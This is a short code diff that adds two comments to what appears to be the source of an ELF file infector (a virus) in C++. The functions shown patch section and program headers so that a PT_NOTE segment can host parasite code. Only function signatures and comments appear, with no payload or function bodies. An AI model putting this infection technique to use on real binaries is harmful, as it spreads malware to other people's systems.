@@ -10,6 +10,7 @@
 namespace vf::infector {
 
 namespace {
+// Patch the pt_note section to account for the virus.
 bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
                uint64_t virus_offset, Elf64_Off original_pt_note_file_offset,
                Elf64_Addr parasite_load_address) {
@@ -33,6 +34,7 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
   return false;
 }
 
+// Patch the pt_note segment to account for the virus.
 void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                 size_t pt_note_to_be_infected_idx,
                 Elf64_Xword pt_load_alignment,
